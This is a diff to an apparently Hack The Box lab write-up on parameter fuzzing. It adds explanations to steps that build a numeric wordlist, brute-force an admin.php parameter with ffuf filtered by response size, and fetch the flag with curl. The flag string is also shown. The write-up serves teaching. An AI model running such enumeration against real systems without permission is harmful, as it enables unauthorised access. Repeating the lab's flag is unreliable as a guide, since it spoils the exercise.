@@ -15,12 +15,13 @@
 
 ## The Workflow
 
-**Step 1 — Generate a numeric wordlist:**
+**Step 1 — Build a numeric wordlist:**
 ```bash
 seq 1 1000 > ids.txt
 # or the for loop equivalent:
 for i in $(seq 1 1000); do echo $i >> ids.txt; done
 ```
+> Generates numbers 1 through 1000 and writes them to a file, one per line. Use this as the wordlist for numeric ID fuzzing. Expand to `seq 1 10000` if the first run finds nothing.
 
 **Step 2 — Fuzz the value position:**
 ```bash
@@ -41,6 +42,7 @@ ffuf -w ids.txt:FUZZ \
   -t 100
 # Returns: 73
 ```
+> First curl measures the size of the "wrong value" response. Then ffuf fuzzes the value position and filters out that size. The one response with a different size is the valid ID.
 
 **Step 3 — Retrieve the flag with curl:**
 ```bash
@@ -51,6 +53,7 @@ curl -s \
   "http://TARGET_IP:PORT/admin/admin.php"
 # Returns: HTB{p4r4m373r_fuzz1n6_15_k3y!}
 ```
+> ffuf only tells you a different response occurred — it doesn't show you the content. Always follow up with curl using the found value to retrieve the actual flag or data.
 
 ---
 
